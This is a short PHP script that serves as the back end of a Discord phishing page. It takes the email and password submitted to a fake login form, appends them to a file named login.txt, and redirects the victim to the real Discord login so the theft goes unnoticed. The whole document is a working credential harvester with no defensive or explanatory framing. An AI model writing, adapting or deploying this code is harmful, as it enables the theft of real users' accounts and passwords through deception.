<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';

    $log = "Discord Username: $email | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://discord.com/login');
    exit();
}
?>
